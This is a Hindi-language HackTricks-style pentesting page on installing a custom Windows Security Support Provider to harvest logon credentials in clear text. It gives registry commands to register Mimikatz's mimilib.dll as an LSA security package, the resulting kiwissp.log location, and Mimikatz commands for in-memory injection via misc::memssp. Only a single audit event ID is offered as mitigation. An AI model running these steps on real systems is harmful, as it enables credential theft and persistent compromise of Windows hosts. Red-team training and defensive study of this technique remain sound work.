# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[SSP (Security Support Provider) के बारे में यहां जानें।](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप मशीन तक पहुंचने के लिए उपयोग किए गए **credentials** को **clear text** में **capture** करने के लिए अपना **SSP** बना सकते हैं।

#### Mimilib

आप Mimikatz द्वारा प्रदान की गई `mimilib.dll` binary का उपयोग कर सकते हैं। **यह सभी credentials को clear text में एक file के अंदर log करेगी।**\
dll को `C:\Windows\System32\` में रखें।\
मौजूदा LSA Security Packages की सूची प्राप्त करें:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
`mimilib.dll` को Security Support Provider list (Security Packages) में जोड़ें:
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
और reboot के बाद सभी credentials `C:\Windows\System32\kiwissp.log` में clear text में पाए जा सकते हैं।

#### मेमोरी में

आप इसे Mimikatz का उपयोग करके सीधे memory में भी inject कर सकते हैं (ध्यान दें कि यह थोड़ा unstable हो सकता है/काम नहीं कर सकता):
```bash
privilege::debug
misc::memssp
```
यह reboot के बाद कायम नहीं रहेगा।

#### Mitigation

Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` के creation/change का Audit

{{#include ../../banners/hacktricks-training.md}}
